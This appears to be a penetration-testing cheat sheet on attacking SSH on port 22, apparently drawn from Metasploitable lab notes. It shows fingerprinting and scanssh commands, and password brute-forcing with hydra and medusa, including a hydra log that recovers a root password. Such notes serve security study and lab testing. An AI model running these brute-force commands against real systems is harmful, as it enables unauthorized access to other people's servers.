### SSH port 22
https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits

* Log in as user
```
$ ssh -l [user] [IP_ADDRESS]
```

+ Fingerprint server  
  ```
  telnet ip_address 22
  ```
  - SSH package version - Might be able to find the OS and version.
  - SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
  - SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)


+ Check the key presented, is the same as others? Is there more than one key presented? https://github.com/rapid7/ssh-badkeys

- scanssh  
  ```
  # scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask
  ```

+ SSH Password guessing

  - Use usernames gathered elsewhere.
  - Use passwords gathered.

  - Test user names gathered earlier, with empty, echo, reverse password  
  ```
  # hydra -e nsr -L users.txt [ip] ssh
  # hydra -L users.txt -P "THE_PASSWORD" ssh://[IP_ADDRESS]
  ```

  OR 'root' user with password file
  ```
  # hydra -l root -P password-file.txt 192.168.11.219 ssh
  Hydra v7.4.2 (c)2012 by van Hauser/THC & David Maciejak
  Hydra (http://www.thc.org/thc-hydra) starting at 2013-04-23 15:54:04 [DATA] 16 tasks, 1 server, 332 login tries (l:1/p:332), ~20 tries per task [DATA] attacking service ssh on port 22
  [ERROR] ssh protocol error
  [ERROR] ssh protocol error
  [22][ssh] host: 192.168.11.219 login: root password: toor
  1 of 1 target successfully completed, 1 valid password found
  ```

  OR using medusa:
  ```
  # medusa -h 192.168.56.103 -U users.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh > medusa_output.txt
  ```

+ SSH Client programs
  - tunnelier
  - winsshd
  - putty
  - winscp

+ Examine configuration files
  - ssh_config
  - sshd_config
  - authorized_keys
  - ssh_known_hosts
  - .shosts
